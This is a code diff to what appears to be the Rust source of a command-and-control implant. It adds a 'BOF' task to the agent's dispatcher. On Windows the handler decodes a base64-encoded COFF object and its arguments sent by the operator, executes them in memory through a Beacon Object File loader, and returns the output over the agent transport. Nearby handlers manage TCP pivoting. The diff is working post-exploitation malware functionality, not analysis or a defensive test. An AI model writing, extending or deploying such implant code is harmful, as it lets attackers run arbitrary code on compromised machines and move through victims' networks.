@@ -1083,6 +1083,28 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "TCP_PIVOT_STOP" => {
             t.send_result(task.id, tcp_pivot::stop_tcp_pivot(), "");
         }
+        "BOF" => {
+            #[cfg(target_os = "windows")]
+            {
+                use base64::Engine as _;
+                let args_obj: serde_json::Value = serde_json::from_str(task.args.as_str())
+                    .unwrap_or_default();
+                let coff_b64 = args_obj["coff_b64"].as_str().unwrap_or("");
+                let args_b64 = args_obj["args_b64"].as_str().unwrap_or("");
+                let coff = base64::engine::general_purpose::STANDARD
+                    .decode(coff_b64)
+                    .unwrap_or_default();
+                let packed = base64::engine::general_purpose::STANDARD
+                    .decode(args_b64)
+                    .unwrap_or_default();
+                match crate::bof::exec_bof(&coff, &packed) {
+                    Ok(out) => t.send_result(task.id, &out, ""),
+                    Err(e)  => t.send_result(task.id, "", &e),
+                }
+            }
+            #[cfg(not(target_os = "windows"))]
+            t.send_result(task.id, "", "BOF not supported on this platform");
+        }
         _ => {
             // Delegate to feature modules
             #[cfg(target_os = "windows")]
